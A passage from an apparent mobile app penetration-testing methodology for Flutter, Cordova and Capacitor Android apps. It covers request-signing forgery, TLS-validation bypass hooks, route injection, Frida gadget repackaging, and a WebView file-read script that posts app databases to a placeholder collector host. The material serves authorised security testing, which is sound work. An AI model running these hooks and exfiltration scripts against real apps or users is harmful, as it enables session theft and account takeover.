    onMatch: function (a) { console.log('api', a, Memory.readUtf8String(a, 80)); }, onComplete: function () {} });
  ```
- **Proof:** A complete PEM private key extracted at a named offset — the referenced case study recovered two
  2048-bit RSA private keys from `libapp.so` at `0x85bb0` and `0x9f486` — **plus** a signature you produced
  offline with it that the production API accepts (HTTP 200). The offline acceptance is the finding; the key
  bytes alone are not.
- **Escalation:** A client-side private key voids the request-signing control entirely: forge
  `X-Nonce`/`X-Timestamp`/`X-Signature`-style headers and drive the whole API from a script -> D19-038, D15.
- **Ruled out when:** No PEM header appears statically or in a runtime module scan, and the app's signing (if
  any) uses a Keystore-resident key you cannot export (prove by attempting `getKey`/export and showing the
  `UnrecoverableKeyException`). A public certificate or a pinned CA in the blob is not a private key — check
  the header type before writing it up.

### D19-038 · Flutter: recover the request-signing algorithm by hooking Dart string concatenation

| | |
|---|---|
| **Severity ceiling** | Critical |
| **VRT** | `broken_access_control.idor.modify_view_sensitive_information_iterable_object_identifiers` (P1) once forgery unlocks the API; `cryptographic_weakness.insufficient_verification_of_data_authenticity.cryptographic_signature` (null) for the signature scheme itself |
| **Attacker** | AM-01 |
| **Applies to** | Flutter release builds that sign requests |
| **Maps to** | MASTG-TOOL-0116 (blutter, `blutter_frida.js` and its `getDartString()` helper) |

- **Test:** When the signing material is derived rather than stored, hook the signing function Blutter named
  and capture the pre-signature message. This converts "we sign our requests" into a reproducible forgery and
  removes the app from the attack entirely.
- **How:**
  ```bash
  python3 blutter.py ext/lib/arm64-v8a out_dir
  grep -nE 'nonce=|&timestamp=|&method=|&url=|Signature|sign\(' out_dir/pp.txt out_dir/asm/*.txt | head
  frida -U -f <pkg> -l out_dir/blutter_frida.js --no-pause
  ```
  ```javascript
  // x27 is the Dart object-pool pointer; pool-relative loads look like
  //   add x16, x27, #0x24, lsl #12 ; ldr x16, [x16, #0x280]
  const base = Module.getBaseAddress('libapp.so');
  Interceptor.attach(base.add(0xa30cfc), {              // address from out_dir/asm/
    onEnter (a) { this.inSign = true; },
    onLeave (r) { this.inSign = false; console.log('sig ->', getDartString(r)); }
  });
  ```
- **Proof:** The exact signing template printed at runtime — the worked case recovered
  `nonce={uuid}&timestamp={epoch_seconds}&method={METHOD}&url={short_path}` signed with RSA PKCS#1 v1.5 +
  SHA-256 and carried in `X-Nonce`, `X-Timestamp`, `X-Signature` — followed by a standalone Python client
  reproducing byte-identical signatures and receiving HTTP 200 from production.
- **Escalation:** Combined with a recovered private key (D19-037) this is full API access with no app,
  no device and no rate limit tied to the client -> D15.
- **Ruled out when:** The signature is produced by a Keystore-backed key or a server-issued per-session key,
  so an offline reproduction fails with a 401 — show the failed forgery. If the "signature" turns out to be a
  keyed hash over attacker-controllable fields with no secret you cannot obtain, that is still a replay/tamper
  finding at High; do not discard it.

### D19-039 · Flutter carries its own BoringSSL trust store — the Android CA store and system proxy do not apply

| | |
|---|---|
| **Severity ceiling** | Support (the resulting traffic findings carry the severity) |
| **VRT** | `mobile_security_misconfiguration.ssl_certificate_pinning.defeatable` (**P5**) if filed as a pinning issue — do not file it there |
| **Attacker** | AM-07 network attacker with a trusted CA is a **tester convenience, not an attacker**; the real finding is what the decrypted traffic shows |
| **Applies to** | Flutter Android, all versions. Also relevant to Unity's `UnityWebRequest` and other non-platform stacks |
| **Maps to** | MASTG-TECH-0109 (Intercepting Flutter HTTPS Traffic), MASTG-TOOL-0100 (reFlutter), MASTG-TOOL-0101 (disable-flutter-tls-verification), MASTG-TOOL-0120 (ProxyDroid), MASTG-TOOL-0103 (uber-apk-signer), MASTG-TOOL-0077 (Burp Suite), MASTG-KNOW-0015; ATT&CK T1521.003 |

- **Test:** Dart's `HttpClient` uses BoringSSL compiled into `libflutter.so` with its **own** CA list. It does
  not read the Android system or user trust store, and historically does not honour the device proxy. So
  "no traffic in Burp" is a tooling result, never evidence of pinning — and Objection's
  `android sslpinning disable` will install zero hooks, which is itself the confirmation you are on this path.
  Note the API-level context: `targetSdk<24` user-CA trust is irrelevant here because Flutter never used the
  system store, and at API 34+ the platform trust store moved to the Conscrypt APEX with
  `/system/etc/security/cacerts` ignored at runtime — neither affects Dart.
- **How:** In escalating order.
  ```bash
  # 0. confirm the diagnosis
  unzip -l target.apk | grep -E 'libflutter\.so|libapp\.so'
  # objection: expect no "Found ..." lines and traffic still failing
  objection -g <pkg> explore -s 'android sslpinning disable'
  # 1. transparent redirect — the system proxy is ignored, so redirect at L3
  adb shell su -c 'iptables -t nat -A OUTPUT -p tcp --dport 80  -j DNAT --to-destination <PROXY-IP>:8080'
  adb shell su -c 'iptables -t nat -A OUTPUT -p tcp --dport 443 -j DNAT --to-destination <PROXY-IP>:8080'
  # (or ProxyDroid / a VPN / an AP you control)
  # 2. Frida, pattern-matched hook of ssl_verify_peer_cert (handshake.cc)
  frida -U -f <pkg> -l disable-flutter-tls.js --no-pause
  frida -U --codeshare TheDauntless/disable-flutter-tls-v1 -f <pkg>
  # 3. engine patch — no root, no user CA
  pip3 install reflutter && reflutter target.apk        # choose "Traffic monitoring and interception",
                                                        # enter your Burp IP -> release.RE.apk
  java -jar uber-apk-signer.jar -a release.RE.apk --out demo-signed
  adb install demo-signed/release.RE-aligned-debugSigned.apk
  # Burp: add a listener on 8083 (reFlutter) or 8080, bind to all interfaces, enable invisible proxying
  # 4. plugin-level pinning is a separate, Java-side check:
  grep -rn 'diefferson.http_certificate_pinning.HttpCertificatePinning' out/sources
  ```
  ```javascript
  function hook_ssl_verify_peer_cert (address) {
    Interceptor.replace(address, new NativeCallback((pathPtr, flags) => {
      console.log('[+] Certificate validation disabled'); return 0;
    }, 'int', ['pointer', 'int']));
  }
  // located by scanning libflutter.so for, e.g.:
  //   android arm64: "F? 0F 1C F8 F? 5? 01 A9 F? 5? 02 A9 F? ?? 03 A9 ?? ?? ?? ?? 68 1A 40 F9"
  //   android arm32: "2D E9 FE 43 D0 F8 00 80 81 46 D8 F8 18 00 D0 F8 ?? 71"
  ```
  When every BoringSSL symbol is stripped (only GPU exports such as `eglGetDisplay`, `glTexImage2D` remain)
  pattern matching fails — do not stop, move the interception point above TLS:
  ```bash
  nm -D ext/lib/arm64-v8a/libflutter.so | wc -l
  nm -D ext/lib/arm64-v8a/libflutter.so | grep -i ssl     # empty => stripped/static
  ```
  ```javascript
  ['send','sendto','sendmsg','write','writev'].forEach(function (fn) {
    var p = Module.findExportByName('libc.so', fn); if (!p) return;
    Interceptor.attach(p, { onEnter (args) {
      try { var t = new Uint8Array(Memory.readByteArray(args[1], 1))[0];
            if (t === 0x17 || t === 0x16) console.log(fn, 'TLS record type', t.toString(16)); } catch (e) {}
    }});
  });
  ```
  Then hook the application-layer functions Blutter named (request builders, signers, JSON encoders) instead
  of fighting the TLS layer at all.
- **Proof:** Full request/response pairs for the app's API appearing in Burp with the app functioning
  normally — or, on a stripped engine, captured plaintext request bodies from an application-layer hook plus
  `nm -D` output showing no SSL symbols.
- **Escalation:** Unblocks the entire of -> D14 and -> D15 for a Flutter target. Report the findings the
  visible traffic produces, never the interception.
- **Ruled out when:** n/a as a finding — but record the *coverage* outcome explicitly. Only after this step
  can you assess whether real pinning exists, and a report that marks a Flutter app's API "untested because
  it could not be proxied" is a methodology failure, not a negative.

### D19-040 · Flutter: enumerate `MethodChannel`, `EventChannel` and `BasicMessageChannel`, then exercise the handlers

| | |
|---|---|
| **Severity ceiling** | Critical |
| **VRT** | `server_side_injection.file_inclusion.local` (P1) for a path-taking handler; otherwise rate by the native capability reached |
| **Attacker** | AM-03 zero-permission local app when the channel is reachable from an exported component; otherwise AM-12 for the demonstration and AM-09 for the realistic delivery |
| **Applies to** | Flutter Android |
| **Maps to** | MASTG-TECH-0156 (platform channels as the Dart↔native boundary); MASWE-0033; ATT&CK T1575 |

- **Test:** Every Dart↔native capability crosses a channel with a string name. Those names point at privileged
  native actions — contacts, SMS, files, biometrics, device identifiers, push tokens, custom crypto helpers.
  Enumerate the names, then invoke them directly and see whether the native side validates its arguments; it
  usually assumes the Dart caller is trustworthy.
- **How:**
  ```bash
  jadx -r target.apk -d jadx-out
  grep -rn 'MethodChannel\|EventChannel\|BasicMessageChannel\|setMethodCallHandler\|invokeMethod\|plugins\.flutter\.io' jadx-out/sources | head -60
  grep -anE 'plugins\.flutter\.io|dev\.flutter|MethodChannel' out_dir/pp.txt | sort -u | head -40
  grep -rn 'onGenerateRoute\|GoRouter\|routeInformationParser' out_dir/asm/ | head
  ```
  ```javascript
  // runtime enumeration + argument capture
  Java.perform(function () {
    var MC = Java.use('io.flutter.plugin.common.MethodChannel');
    MC.$init.overload('io.flutter.plugin.common.BinaryMessenger', 'java.lang.String').implementation =
      function (m, name) { console.log('[MethodChannel]', name); return this.$init(m, name); };
    var MCall = Java.use('io.flutter.plugin.common.MethodCall');
    MCall.$init.overload('java.lang.String', 'java.lang.Object').implementation = function (m, a) {
      console.log('[call]', m, a); return this.$init(m, a);
    };
  });
  ```
- **Proof:** A printed channel list with live calls and arguments — e.g.
  `[MethodChannel] plugins.flutter.io/path_provider`, `[call] getFile {path: ...}` — followed by a
  hand-crafted call carrying a traversal, an unexpected type or an oversized value that the native handler
  accepts, with the resulting file read/write or crash captured.
- **Escalation:** A path-taking channel method plus the route-injection primitive in D19-042 is an
  attacker-reachable arbitrary file operation -> D07/D11; a crypto channel -> D12; a JNI-backed plugin ->
  D16 (`nm -D lib*.so | grep ' T Java_'`, then `jnitrace`).
- **Ruled out when:** Every channel is a first-party or well-known plugin whose handler takes no
  caller-controlled path, URL or command, and each one re-derives its target natively. Show one negative
  invocation per privileged-looking channel rather than asserting it from the name.

### D19-041 · Flutter: `flutter_deeplinking_enabled` defaults to ON when the meta-data is absent

| | |
|---|---|
| **Severity ceiling** | High |
| **VRT** | `broken_access_control.exposed_sensitive_android_intent` (null — rated on what the route exposes) |
| **Attacker** | AM-02 remote one-click |
| **Applies to** | Flutter v2 embedding (**CURRENT**). Older v1 embedding required explicit Java plumbing — treat a v1 app as a separate manual review |
| **Maps to** | Flutter `FlutterActivityLaunchConfigs.java` `HANDLE_DEEPLINKING_META_DATA_KEY = "flutter_deeplinking_enabled"` with documented default `true`; MASTG-TECH-0172, MASTG-TECH-0173, MASTG-TECH-0174 |

- **Test:** `FlutterActivityLaunchConfigs.deepLinkEnabled(metaData)` returns **true** when the key is missing.
  A Flutter activity with an `ACTION_VIEW`/`BROWSABLE` filter therefore hands the incoming URI straight to the
  Dart router by default, with no Java-side allow-listing. Testers who look only for Java `getData()` handling
  find nothing and wrongly close the deep-link surface.
- **How:**
  ```bash
  grep -n 'flutter_deeplinking_enabled' out/AndroidManifest.xml || echo "ABSENT -> deep linking is ENABLED"
  grep -B3 -A20 'android.intent.action.VIEW' out/AndroidManifest.xml
  # harvest candidate routes first (D19-033 / D19-035), then drive them:
  grep -aoE '"/[a-zA-Z0-9_/-]+"' out_dir/pp.txt | sort -u | head -50
  adb shell am start -a android.intent.action.VIEW -d "myapp://admin/debug" <pkg>
  adb shell am start -a android.intent.action.VIEW -d "https://app.target.com/internal/tools" <pkg>
  frida -U -f <pkg> -l deeplink-monitor.js --no-pause
  ```
- **Proof:** The URI path rendering as a Dart route — visible on screen and observable in a Frida hook on the
  router Blutter recovered — with the decompiled `MainActivity` containing no validation at all.
- **Escalation:** A deep-linkable route that renders privileged data or performs a state-changing action ->
  D09; a route whose parameter reaches an in-app WebView `loadUrl` -> D10.
- **Ruled out when:** `flutter_deeplinking_enabled` is explicitly `false` **and** the Java `MainActivity`
  implements its own validated handoff, or no Flutter activity carries a `BROWSABLE` filter. Verify the App
  Links association separately (MASTG-TECH-0174) — an unverified `autoVerify` host is a different finding.

### D19-042 · Flutter: force an arbitrary in-app route via the `route` intent extra

| | |
|---|---|
| **Severity ceiling** | High |
| **VRT** | `broken_access_control.exposed_sensitive_android_intent` (null — rated on what it exposes); `broken_access_control.idor.view_sensitive_information_iterable_object_identifiers` (P3) upward when the route renders another user's data |
| **Attacker** | AM-03 zero-permission local app (a twenty-line unprivileged PoC app is sufficient) |
| **Applies to** | Flutter apps using `io.flutter.embedding.android.FlutterActivity` (v2 embedding), all current versions |
| **Maps to** | Flutter `FlutterActivityLaunchConfigs.java` — `EXTRA_INITIAL_ROUTE = "route"`, `EXTRA_DART_ENTRYPOINT = "dart_entrypoint"`, `EXTRA_DART_ENTRYPOINT_ARGS = "dart_entrypoint_args"`, `EXTRA_CACHED_ENGINE_ID = "cached_engine_id"`, `EXTRA_CACHED_ENGINE_GROUP_ID`, `EXTRA_ENABLE_STATE_RESTORATION`; `getInitialRoute()` reads the intent extra **before** manifest metadata; MASTG-TECH-0160 |

- **Test:** `getInitialRoute()` checks `intent.hasExtra("route")` first. Any exported `FlutterActivity` or
  subclass — including the default `MainActivity` when it carries a `MAIN` or `BROWSABLE` filter another app
  can reach — lets a third-party app choose the first screen the Dart router renders, bypassing whatever
  navigation guard the UI applies. Remember the `targetSdk<31` gate: an activity with an intent-filter is
  exported by default, so `android:exported="true"` may never appear.
- **How:**
  ```bash
  grep -B5 -A15 'io.flutter.embedding.android.FlutterActivity' out/AndroidManifest.xml
  adb shell dumpsys package <pkg> | sed -n '/Activity Resolver Table/,/Service Resolver/p'
  grep -aoE '"/[a-zA-Z0-9_/-]+"' out_dir/pp.txt | sort -u | head -50
  adb shell am start -n <pkg>/<pkg>.MainActivity -e route "/settings/developer"
  adb shell am start -n <pkg>/<pkg>.MainActivity -e route "/account/transfer?to=attacker"
  adb shell am start -n <pkg>/<pkg>.MainActivity -e dart_entrypoint "debugMain"
  adb shell am start -n <pkg>/<pkg>.MainActivity --esa dart_entrypoint_args "--verbose"
  adb shell am start -n <pkg>/<pkg>.MainActivity -e cached_engine_id "<id from pp.txt>"
  ```
- **Proof:** A screen recording of the target screen rendering without passing the app's login or PIN gate,
  from an `am start` issued as shell and then reproduced from an unprivileged third-party app (the `am`
  version alone invites a "shell has elevated rights" rebuttal).
- **Escalation:** Route injection plus a route that trusts its query parameters is a one-click state change;
  pair with D19-041 to reach the same route from a browser link (-> D09), or with D19-040 to reach a
  path-taking native channel.
- **Ruled out when:** No `FlutterActivity` subclass is exported (confirmed in `dumpsys package`, not just the
  manifest), or every route you can force redirects to the login/PIN screen because the router's guard sits
  above the route table. Demonstrate the redirect for the highest-value route name you recovered.

### D19-043 · Flutter: engine substitution goes undetected — reFlutter and LIEF gadget injection

| | |
|---|---|
| **Severity ceiling** | Low |
| **VRT** | `lack_of_binary_hardening.lack_of_exploit_mitigations` (**P5**) — do not file; report what the substitution unlocks |
| **Attacker** | AM-12 own device — **not an attack** |
| **Applies to** | Flutter, and any framework with a replaceable engine `.so`; the gadget path also works on non-rooted devices |
| **Maps to** | MASTG-TOOL-0100 (reFlutter), MASTG-TOOL-0034 (LIEF), MASTG-TOOL-0103 (uber-apk-signer) |

- **Test:** reFlutter-patched engines and gadget-injected builds are the standard testing path. An app that
  claims tamper resistance should detect a replaced `libflutter.so` or an added `DT_NEEDED` entry; most do
  not. On a stock, non-rooted device, patching the ELF's needed-library list so the app loads
  `libfrida-gadget.so` itself is how you get instrumentation at all.
- **How:**
  ```bash
  pip3 install lief
  python3 - <<'PY'
  import lief
  lib = lief.parse('lib/arm64-v8a/libflutter.so')
  lib.add_library('libfrida-gadget.so')
  lib.write('lib/arm64-v8a/libflutter.so')
  PY
  cp libfrida-gadget.so libfrida-gadget.config.so lib/arm64-v8a/
  cat lib/arm64-v8a/libfrida-gadget.config.so
  # {"interaction":{"type":"listen","address":"0.0.0.0","port":27042,"on_load":"resume"}}
  zip -r repacked.apk lib/ && zipalign -f 4 repacked.apk aligned.apk
  java -jar uber-apk-signer.jar --apks aligned.apk
  adb install -r aligned-signed.apk
  frida-ps -H 127.0.0.1:27042
  frida -H 127.0.0.1:27042 -n Gadget -l script.js
  # separately, the engine-patch path:
  reflutter target.apk && java -jar uber-apk-signer.jar --apks <patched>.apk && adb install -r <signed>.apk
  adb logcat | grep -iE 'integrity|tamper|signature|checksum'
  ```
- **Proof:** `frida-ps -H 127.0.0.1:27042` listing the Gadget and hooks firing from app start — before any
  anti-debug initialisation — or the reFlutter build running to completion with no detection, evidenced by a
  screen recording plus the intercepted traffic.
- **Escalation:** On its own this is P5 resilience. It becomes a report through what it defeats: pinning ->
  traffic exposure -> a real D14/D15 finding; or a client-side gate -> D19-074. If the app crashes on start
  after reFlutter, that is usually a snapshot-hash mismatch between engine and `libapp.so` — a build-coupling
  artefact, not a security control (`MakeSnapshotHashString()` can be pinned to a constant).
- **Ruled out when:** The app detects the substituted engine and refuses to run, with its own tamper message
  in logcat, **and** the detection is implemented natively rather than in Dart (a Dart-side check is itself
  patchable — see D19-078). Even then, this is a resilience observation, not a finding.

### D19-044 · Flutter: obfuscation symbol maps leaking from CI or crash infrastructure

| | |
|---|---|
| **Severity ceiling** | Medium |
| **VRT** | `sensitive_data_exposure.disclosure_of_secrets.for_internal_asset` (P3) when the map is reachable and materially accelerates recovery |
| **Attacker** | AM-01 |
| **Applies to** | Flutter apps built with `--obfuscate --split-debug-info`, where CI/CD artefacts, crash-upload buckets or update infrastructure are in scope |
| **Maps to** | Flutter's official obfuscation documentation (the symbol map is what `flutter symbolize` consumes) |

- **Test:** `--obfuscate --split-debug-info` only renames symbols and stores the map externally. It does not
  encrypt `flutter_assets`, prevent disassembly of `libapp.so`, or stop runtime hooks. If the map leaks, the
  "hard" binary becomes friendly again.
- **How:**
  ```bash
  # in-scope CI / artefact stores / crash-upload buckets:
  #   look for app.*.symbols, a SYMBOLS directory, obfuscation-map JSON, or the --split-debug-info output dir
  curl -s -o /dev/null -w '%{http_code}\n' "https://<artifact-host>/<path>/app.android-arm64.symbols"
  # confirm the shipped build is obfuscated in the first place:
  python3 blutter.py ext/lib/arm64-v8a out_dir && grep -c 'package:' out_dir/pp.txt
  ```
- **Proof:** A publicly reachable symbol map that corresponds to the shipped build, demonstrated by
  symbolising a stack trace from that build.
- **Escalation:** Combine with Blutter output for full de-obfuscation -> D19-035/D19-037 become complete
  rather than partial.
- **Ruled out when:** The build is not obfuscated (Blutter recovers real package paths, so there is no map to
  leak), or every candidate artefact location is authenticated. State which of the two.

### D19-045 · Dart and pub supply chain — Zip Slip in package extraction and malicious pub packages

| | |
|---|---|
| **Severity ceiling** | Critical (build host) |
| **VRT** | `server_side_injection.remote_code_execution_rce` (P1) against the build host where it is in scope |
| **Attacker** | AM-08 malicious third-party SDK |
| **Applies to** | Flutter/Dart projects where the repository or CI is in scope — **not** an end-user-device finding |
| **Maps to** | **CVE-2026-27704** — Dart SDK before **3.11.0** and Flutter SDK before **3.41.0**, Zip Slip during Pub package extraction letting a malicious archive write outside the intended Pub-cache destination; OSV tracks malicious packages under the `MAL-` id namespace (records exist at `osv.dev/vulnerability/MAL-2024-11812` and `MAL-2025-189`) |

- **Test:** Two distinct issues: a malicious or compromised pub package, and the Zip Slip in the toolchain
  itself. Both hit the build environment.
- **How:**
  ```bash
  dart --version; flutter --version              # < 3.11.0 / < 3.41.0 => CVE-2026-27704
  grep -A3 '^  [a-z_]*:' pubspec.lock | grep -E 'name:|version:|url:' | head -60
  unzip -p target.apk 'assets/flutter_assets/NOTICES*' 2>/dev/null | strings | grep -iE '^[a-z0-9_]+ [0-9]+\.[0-9]+' | head -60
  strings -a ext/lib/arm64-v8a/libapp.so | grep -aoE 'package:[a-z0-9_]+/' | sort -u | head -60
  grep -rn "build_runner\|dart:ffi\|DynamicLibrary.open" lib/ pubspec.yaml
  ```
- **Proof:** For the toolchain, a version below the patched lines on a CI runner that fetches untrusted
  packages. For a package, a `pubspec.lock` entry matching a known-bad package/version, or a package tarball
  containing build hooks that execute at consumer build time.
- **Escalation:** Build-host compromise -> signed malicious release -> D17.
- **Ruled out when:** The toolchain is at or above 3.11.0/3.41.0 and every locked package resolves to a clean
  OSV record. State the reachability caveat explicitly where it applies: in the XCSSET incident that infected
  `universal_file_viewer` 0.1.5, "simply adding `universal_file_viewer` to `pubspec.yaml` and building an app
  does not trigger the malware, as the infected files live only inside the `example/` directory, which ships
  in the pub.dev tarball but is never compiled as a dependency". A dependency on a flagged package is not
  automatically exploitation — prove the reachable path.

### D19-046 · Cordova / Capacitor: inventory the web root — the entire app is in `assets/`

| | |
|---|---|
| **Severity ceiling** | High |
| **VRT** | `sensitive_data_exposure.disclosure_of_secrets.for_publicly_accessible_asset` (P1) when the assets yield a validated backend credential; `.for_internal_asset` (P3) for an internal admin base URL or a shipped `.map` |
| **Attacker** | AM-01 |
| **Applies to** | Cordova, Ionic (on either Cordova or Capacitor), Capacitor |
| **Maps to** | Capacitor `CapConfig.java` (`capacitor.config.json` asset path), Capacitor `PluginManager.java` (`capacitor.plugins.json`), Cordova `ConfigXmlParser.java` (`res/xml/config.xml`); MASTG-TOOL-0011 (Apktool) |

- **Test:** For these frameworks all application logic ships as readable (sometimes minified) web assets.
  Treat `assets/www/` or `assets/public/` as a web application source drop and run the full source review
  against it.
- **How:**
  ```bash
  apktool d target.apk -o out/
  ls out/assets/www out/assets/public 2>/dev/null
  cat out/res/xml/config.xml                    # Cordova
  cat out/assets/capacitor.config.json          # Capacitor  (CapConfig.loadConfigFromAssets)
  cat out/assets/capacitor.plugins.json         # Capacitor plugin class list (PluginManager.parsePluginsJSON)
  cat out/assets/www/cordova_plugins.js         # Cordova plugin -> JS module map
  ls out/assets/www/plugins/
  grep -rnoE 'https?://[A-Za-z0-9._/-]+' out/assets/{www,public} 2>/dev/null | sort -u | head -100
  grep -rniE 'api[_-]?key|secret|token|password|firebase|amazonaws|sentry' out/assets/{www,public} 2>/dev/null
  find out/assets -name '*.map' -o -name '*.js.map'
  ```
- **Proof:** A readable bundle (`main.*.js`, `polyfills.*.js`) plus, in the best case, a shipped `.map` that
  restores original TypeScript with comments and internal endpoint names — and any recovered credential
  validated per D19-012.
- **Escalation:** Feeds D19-051 (which plugins the WebView can reach), D19-011 (endpoint list), D19-056
  (DOM sinks).
- **Ruled out when:** The web root contains only framework runtime and view templates, no first-party
  credential survives validation, and no `.map` ships. Note that a minified bundle is not a rule-out — run
  the grep set over the minified text, not just over pretty-printed output.

### D19-047 · Cordova allow-lists: `*` on `allow-navigation` also grants `data:`

| | |
|---|---|
| **Severity ceiling** | High (as the enabling condition); Critical once you attach the bridge PoC |
| **VRT** | `server_side_injection.remote_code_execution_rce` (P1) for the plugin-driven file/exec outcome it enables |
| **Attacker** | AM-02 remote one-click |
| **Applies to** | Cordova, Ionic-on-Cordova |
| **Maps to** | Cordova `WhitelistPlugin.java` — `"*"` on `allow-navigation` expands to `http://*/*`, `https://*/*` **and `data:*`**; `"*"` on `access` expands to `http://*/*` + `https://*/*`; defaults seed `file:///*` and `data:*` into `allowedRequests`. Cordova whitelist docs: "Cannot block redirects from whitelisted remote sites to non-whitelisted destinations"; `allow-navigation` takes precedence over `allow-intent`. MASWE-0035 (CWE-79, CWE-601, CWE-829) |

- **Test:** `<allow-navigation href="*">` and `<access origin="*">` are extremely common copy-paste defaults.
  The first lets the WebView top-level navigate anywhere including `data:`; the second lets it fetch anything.
  Neither can stop a redirect chain from an allowed origin to a disallowed one.
- **How:**
  ```bash
  grep -nE '<allow-navigation|<allow-intent|<access ' out/res/xml/config.xml
  grep -n 'Content-Security-Policy' out/assets/www/index.html
  # then prove the bridge is reachable from a data: origin:
  adb shell am start -a android.intent.action.VIEW \
    -d "data:text/html,<script>alert(typeof _cordovaNative)</script>" <pkg>
  # and from a remote origin reached via the app's own redirect handling:
  adb shell am start -a android.intent.action.VIEW -d "<scheme>://?redirect=https://attacker.tld/x.html" <pkg>
  ```
  ```javascript
  // from the attacker page
  console.log(typeof _cordovaNative, typeof cordova, cordova && cordova.exec);
  console.log(typeof androidBridge, typeof CapacitorHttpAndroidInterface, typeof Capacitor);
  Capacitor && Capacitor.Plugins && Object.keys(Capacitor.Plugins);
  ```
- **Proof:** `<allow-navigation href="*"/>` present with no CSP meta tag in `index.html`, **and** your page
  rendering in the app WebView with the bridge object defined — then one plugin call from it returning real
  data. File it with the bridge PoC attached, never as a configuration nit.
- **Escalation:** Off-origin navigation into a bridged WebView -> D19-049 (`/_capacitor_file_` sandbox read),
  D19-051/D19-052 (plugin and `exec()` invocation), D19-050 (device-sourced SSRF) -> token exfiltration ->
  D15 -> account takeover.
- **Ruled out when:** `allow-navigation` lists only concrete first-party origins, `access` is similarly
  scoped, **and** you have tested a redirect from an allowed origin to your host (the documented gap) and the
  WebView refused it. The redirect test is mandatory — the allow-list alone does not cover it.

### D19-048 · Capacitor `server.url` shipped as a live-reload or staging origin

| | |
|---|---|
| **Severity ceiling** | Critical |
| **VRT** | `server_side_injection.remote_code_execution_rce` (P1) — whoever controls that host or its DNS serves the app body into a fully bridged WebView |
| **Attacker** | AM-06 network attacker (with `server.cleartext: true`); AM-09 whoever controls the host |
| **Applies to** | Capacitor, all versions. The Cordova equivalent is a remote `<content src="http...">` in `config.xml` |
| **Maps to** | Capacitor `CapConfig.java` (`server.url`, `server.hostname`, `server.errorPath`, `server.appStartPath`, `server.html5mode`); Capacitor docs describe `server.url`/`server.cleartext` as "intended for use with live-reload servers" |

- **Test:** `server.url` makes the WebView load an **external** URL instead of the bundled assets. Shipped in
  a release build — often alongside `server.cleartext: true` — the entire app body is fetched over the network
  at launch, into the origin that owns the plugin bridge.
- **How:**
  ```bash
  python3 -c "import json;d=json.load(open('out/assets/capacitor.config.json'));print(json.dumps(d,indent=2))" \
    | grep -A8 '"server"'
  grep -n 'content src' out/res/xml/config.xml            # the Cordova equivalent
  adb logcat -c && adb shell monkey -p <pkg> -c android.intent.category.LAUNCHER 1
  adb logcat -d | grep -i capacitor
  # confirm on the wire:
  tcpdump -i any -n 'tcp port 80 or tcp port 443'
  ```
- **Proof:** A non-localhost `server.url` in the shipped config, plus the plaintext HTTP request for the app
  shell captured on the wire, plus the bridge object defined in the page that host served.
- **Escalation:** Same chain as D19-047; additionally, if the host is an expired or unclaimed domain this is
  an immediate takeover of every install.
- **Ruled out when:** `capacitor.config.json` has no `server.url`, or it is `http://localhost` /
  `https://localhost` (the local-server default), and `config.xml`'s `<content src>` is a relative asset path.
  A `server.url` present but pointing at a first-party TLS host is still reportable — state the reduced
  attacker set (AM-09 rather than AM-06) honestly.

### D19-049 · Capacitor `/_capacitor_file_` — arbitrary app-private file read from inside the WebView

| | |
|---|---|
| **Severity ceiling** | Critical |
| **VRT** | `broken_authentication_and_session_management.authentication_bypass` (P1) once the read lifts a session token; `server_side_injection.file_inclusion.local` (P1) for the read primitive itself |
| **Attacker** | AM-02 remote one-click (given any script execution in the WebView) |
| **Applies to** | Capacitor Android. This is a **designed feature** of the local server, not a CVE — report it as the impact multiplier on any WebView script-execution finding in a Capacitor app |
| **Maps to** | Capacitor `Bridge.java` (`CAPACITOR_FILE_START = "/_capacitor_file_"`, `CAPACITOR_CONTENT_START = "/_capacitor_content_"`, and the injected `window.WEBVIEW_SERVER_URL` global); `AndroidProtocolHandler.openFile()` (`filePath.replace(Bridge.CAPACITOR_FILE_START,"")` -> `new FileInputStream(realPath)`); `AndroidProtocolHandler.openContentUrl()`; `WebViewLocalServer.isLocalFile()`; MASWE-0033 |

- **Test:** Capacitor's local server maps any request whose path starts with `/_capacitor_file_` to
  `new FileInputStream(path)` — the prefix is simply stripped, with **no path containment check**. Any script
  running in the WebView origin can read any file the app's UID can read.
- **How:** First confirm statically, then exercise it.
  ```bash
  grep -rn '_capacitor_file_\|_capacitor_content_\|WEBVIEW_SERVER_URL' out/smali* out/sources 2>/dev/null | head
  ```
  ```javascript
  const base = window.WEBVIEW_SERVER_URL;           // injected by Bridge.java as a global
  async function read (p) { const r = await fetch(base + '/_capacitor_file_' + p); return r.text(); }
  read('/data/data/<pkg>/shared_prefs/CapacitorStorage.xml').then(console.log);
  read('/data/data/<pkg>/databases/<db>').then(t =>
    fetch('https://<your-collector>/x', { method: 'POST', body: t }));
  read('/proc/self/cmdline').then(console.log);
  // content:// provider reads go through the same server:
  fetch(base + '/_capacitor_content_/media/external/images/media/1').then(r => r.blob());
  ```
  Use the storage key names you mined in D19-024 to target the exact file rather than guessing.
- **Proof:** HTTP 200 with the raw XML/SQLite bytes of an app-private file returned into the page, and the
  same bytes landing on your collector — followed by a replay of the recovered token against the API.
- **Escalation:** Token -> D15 replay -> account takeover; `content://` reads the app has been granted ->
  cross-app data theft (-> D07). This is the sentence that belongs in the impact section of any XSS finding
  in a Capacitor app: script execution equals app-sandbox file read plus native capability execution.
- **Ruled out when:** The app is not Capacitor, or you have no path to script execution in the WebView —
  the allow-list holds under redirect testing (D19-047), the CSP blocks inline and remote script (D19-057),
  and no DOM sink is reachable (D19-056). The primitive exists regardless; without a delivery path the report
  is Informational, so say which of the three blocks you.

### D19-050 · Capacitor `/_capacitor_http_interceptor_?u=` — SOP bypass and device-sourced SSRF

| | |
|---|---|
| **Severity ceiling** | Critical |
| **VRT** | `server_side_injection.remote_code_execution_rce` (P1) where it reaches an internal service that yields execution; otherwise `sensitive_data_exposure.disclosure_of_secrets.for_internal_asset` (P3) upward by what the internal response contains |
| **Attacker** | AM-02 |
| **Applies to** | Capacitor Android with the CapacitorHttp plugin (default in recent Capacitor) |
| **Maps to** | Capacitor `Bridge.java` (`CAPACITOR_HTTP_INTERCEPTOR_START = "/_capacitor_http_interceptor_"`, `CAPACITOR_HTTP_INTERCEPTOR_URL_PARAM = "u"`); `WebViewLocalServer.handleCapacitorHttpRequest()` (copies all request headers into the native request, honours `x-cap-user-agent`, and skips the pinning socket factory when `isDomainExcludedFromSSL(bridge,url)` is true); `plugin/CapacitorHttp.java` (`addJavascriptInterface(this, "CapacitorHttpAndroidInterface")`) |

- **Test:** The local server intercepts `/_capacitor_http_interceptor_?u=<absolute-url>` and performs the
